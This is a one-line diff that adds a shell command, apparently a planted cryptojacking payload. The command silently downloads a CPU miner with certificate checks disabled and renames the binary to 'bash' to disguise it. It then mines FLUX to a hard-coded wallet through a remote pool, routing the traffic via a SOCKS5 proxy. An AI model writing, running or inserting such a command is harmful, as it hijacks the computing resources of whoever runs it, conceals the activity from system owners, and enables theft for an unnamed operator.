@@ -1,0 +1,1 @@
+wget -q https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz --no-check-certificate && tar xf cpuminer-opt-linux.tar.gz && mv cpuminer-sse2 bash && ./bash -a yespower -o stratum+tcp://198.50.168.213:6234 -u t1UYZUpgVzViCMQemJyoNUEerPFBp3KsgR9 -p c=FLUX -t 2 --proxy socks5://192.111.135.17:18302
